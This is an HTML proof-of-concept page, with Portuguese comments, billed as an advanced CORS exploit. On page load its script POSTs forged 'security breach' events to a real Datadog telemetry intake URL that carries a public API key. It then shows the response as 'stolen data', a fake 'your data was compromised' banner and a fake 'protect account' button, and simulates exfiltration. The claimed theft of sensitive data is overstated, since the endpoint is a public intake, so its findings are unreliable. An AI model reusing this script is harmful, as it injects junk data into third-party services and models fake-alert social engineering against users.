<!DOCTYPE html>
<html>
<head>
    <title>POC Avan√ßada - Explora√ß√£o CORS com Impacto na P√°gina</title>
    <style>
        .hidden { display: none; }
        .malicious-banner { 
            background: red; 
            color: white; 
            padding: 20px; 
            position: fixed; 
            top: 0; 
            width: 100%; 
            z-index: 10000;
        }
        .stolen-data {
            background: #ffeb3b; 
            border: 2px dashed red;
            padding: 15px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <h1>POC Avan√ßada - Explora√ß√£o CORS com Impacto Visual</h1>
    
    <div id="maliciousBanner" class="hidden malicious-banner">
        ‚ö†Ô∏è SEUS DADOS FORAM COMPROMETIDOS - Contate o suporte imediatamente!
    </div>

    <div id="contentHijack" class="hidden">
        <h2 style="color: red;">üö® ALERTA DE SEGURAN√áA</h2>
        <p>Sua sess√£o foi comprometida atrav√©s de uma vulnerabilidade CORS.</p>
    </div>

    <div id="stolenDataContainer"></div>

    <script>
        const VULNERABLE_ENDPOINTS = [
            'https://browser-intake-datadoghq.com/api/v2/rum?ddsource=browser&dd-api-key=pub75ad0c3b08ce2dd249e3dba1791bca84',
            // Poderia incluir outros endpoints vulner√°veis
        ];

        // Dados maliciosos para injetar
        const MALICIOUS_PAYLOADS = [
            {
                "rum": [
                    {
                        "date": Date.now(),
                        "type": "security_breach",
                        "message": "CORS exploitation successful - user data compromised",
                        "user_agent": navigator.userAgent,
                        "referrer": document.referrer,
                        "cookies_enabled": navigator.cookieEnabled,
                        "language": navigator.language,
                        "platform": navigator.platform
                    }
                ]
            },
            {
                "rum": [
                    {
                        "date": Date.now() + 1000,
                        "type": "malicious_activity",
                        "message": "Injected via CORS misconfiguration",
                        "severity": "high",
                        "action": "data_exfiltration"
                    }
                ]
            }
        ];

        class CORSExploiter {
            constructor() {
                this.stolenData = [];
                this.successfulRequests = 0;
            }

            // 1. Demonstra leitura de dados sens√≠veis
            async exploitDataRead() {
                const endpoint = VULNERABLE_ENDPOINTS[0];
                
                try {
                    const response = await fetch(endpoint, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Exploit-Test': 'CORS-POC'
                        },
                        body: JSON.stringify(MALICIOUS_PAYLOADS[0])
                    });

                    if (response.ok) {
                        this.successfulRequests++;
                        const data = await response.text();
                        
                        // Armazena dados roubados
                        this.stolenData.push({
                            endpoint: endpoint,
                            status: response.status,
                            headers: this.extractHeaders(response),
                            body: data,
                            timestamp: new Date().toISOString()
                        });

                        // 2. IMPACTO VISUAL IMEDIATO - Mostra banner de alerta
                        this.showSecurityBreachBanner();
                        
                        // 3. Exibe dados roubados na p√°gina
                        this.displayStolenData();
                        
                        // 4. Continua explora√ß√£o com payload adicional
                        setTimeout(() => this.exploitWithAdditionalPayload(), 2000);
                        
                        return true;
                    }
                } catch (error) {
                    console.error('Erro na explora√ß√£o:', error);
                    return false;
                }
            }

            // Explora√ß√£o adicional com mais impacto
            async exploitWithAdditionalPayload() {
                const endpoint = VULNERABLE_ENDPOINTS[0];
                
                try {
                    const response = await fetch(endpoint, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Malicious-Payload': 'true'
                        },
                        body: JSON.stringify(MALICIOUS_PAYLOADS[1])
                    });

                    if (response.ok) {
                        this.successfulRequests++;
                        const data = await response.text();
                        
                        this.stolenData.push({
                            type: 'additional_exploit',
                            status: response.status,
                            response: data,
                            timestamp: new Date().toISOString()
                        });

                        // 5. IMPACTO: Modifica conte√∫do da p√°gina
                        this.hijackPageContent();
                        
                        // 6. Simula exfiltra√ß√£o de dados
                        this.simulateDataExfiltration();
                    }
                } catch (error) {
                    console.error('Erro na explora√ß√£o adicional:', error);
                }
            }

            // Extrai cabe√ßalhos da resposta
            extractHeaders(response) {
                const headers = {};
                response.headers.forEach((value, name) => {
                    headers[name] = value;
                });
                return headers;
            }

            // IMPACTO 1: Banner de seguran√ßa falso
            showSecurityBreachBanner() {
                const banner = document.getElementById('maliciousBanner');
                banner.classList.remove('hidden');
                
                // Adiciona efeito piscante
                setInterval(() => {
                    banner.style.backgroundColor = banner.style.backgroundColor === 'red' ? 'darkred' : 'red';
                }, 1000);
            }

            // IMPACTO 2: Exibe dados "roubados"
            displayStolenData() {
                const container = document.getElementById('stolenDataContainer');
                container.innerHTML = `
                    <div class="stolen-data">
                        <h3>üìã DADOS CAPTURADOS DA VULNERABILIDADE CORS</h3>
                        <p><strong>Requisi√ß√µes Bem-sucedidas:</strong> ${this.successfulRequests}</p>
                        <p><strong>Endpoint Vulner√°vel:</strong> ${VULNERABLE_ENDPOINTS[0].split('?')[0]}</p>
                        <p><strong>Dados da Resposta:</strong> ${JSON.stringify(this.stolenData[0].body)}</p>
                        <p><strong>Timestamp:</strong> ${this.stolenData[0].timestamp}</p>
                        <p><strong>User Agent Comprometido:</strong> ${navigator.userAgent}</p>
                    </div>
                `;
            }

            // IMPACTO 3: Sequestro de conte√∫do
            hijackPageContent() {
                const hijackDiv = document.getElementById('contentHijack');
                hijackDiv.classList.remove('hidden');
                
                // Adiciona conte√∫do malicioso
                hijackDiv.innerHTML += `
                    <div style="border: 2px solid red; padding: 15px; margin: 10px 0;">
                        <h4>‚ö†Ô∏è A√ß√£o Recomendada (FALSA):</h4>
                        <p>Clique aqui para "proteger" sua conta: 
                        <button onclick="alert('Isso √© uma simula√ß√£o de ataque!')" style="background: red; color: white; border: none; padding: 5px 10px; cursor: pointer;">
                            Proteger Conta
                        </button>
                        </p>
                    </div>
                `;
            }

            // IMPACTO 4: Simula exfiltra√ß√£o de dados
            simulateDataExfiltration() {
                console.log('üö® SIMULA√á√ÉO: Dados sendo exfiltrados para atacante...');
                console.log('Dados capturados:', this.stolenData);
                
                // Simula envio para servidor malicioso
                setTimeout(() => {
                    const exfiltrationData = {
                        stolenData: this.stolenData,
                        pageUrl: window.location.href,
                        exploitationTime: new Date().toISOString()
                    };
                    
                    console.log('üì§ Dados prontos para exfiltra√ß√£o:', exfiltrationData);
                    alert('SIMULA√á√ÉO: Dados seriam enviados para servidor do atacante agora!');
                }, 3000);
            }

            // Gera relat√≥rio final
            generateReport() {
                return {
                    totalExploits: this.successfulRequests,
                    vulnerabilities: ['CORS Misconfiguration - Access-Control-Allow-Origin: *'],
                    impacts: [
                        'Leitura de dados sens√≠veis cross-origin',
                        'Modifica√ß√£o de conte√∫do da p√°gina', 
                        'Exfiltra√ß√£o simulada de dados',
                        'Engenharia social via alertas falsos'
                    ],
                    recommendations: [
                        'Restringir Access-Control-Allow-Origin para dom√≠nios espec√≠ficos',
                        'Validar origens em requisi√ß√µes CORS',
                        'Implementar CORS de forma segura'
                    ]
                };
            }
        }

        // Executa a explora√ß√£o quando a p√°gina carrega
        document.addEventListener('DOMContentLoaded', async () => {
            const exploiter = new CORSExploiter();
            
            // Inicia a explora√ß√£o
            const success = await exploiter.exploitDataRead();
            
            // Mostra relat√≥rio final ap√≥s 5 segundos
            setTimeout(() => {
                const report = exploiter.generateReport();
                console.log('üìä RELAT√ìRIO FINAL DA EXPLORA√á√ÉO:', report);
                
                // Adiciona relat√≥rio √† p√°gina
                const reportDiv = document.createElement('div');
                reportDiv.style.background = '#e8f5e8';
                reportDiv.style.padding = '15px';
                reportDiv.style.margin = '10px 0';
                reportDiv.style.border = '2px solid green';
                reportDiv.innerHTML = `
                    <h3>üìä RELAT√ìRIO DA EXPLORA√á√ÉO CORS</h3>
                    <p><strong>Status:</strong> ${success ? 'VULNER√ÅVEL' : 'PROTEGIDO'}</p>
                    <p><strong>Requisi√ß√µes Bem-sucedidas:</strong> ${report.totalExploits}</p>
                    <p><strong>Impactos Demonstrados:</strong> ${report.impacts.join(', ')}</p>
                `;
                document.body.appendChild(reportDiv);
            }, 5000);
        });
    </script>
</body>
</html>
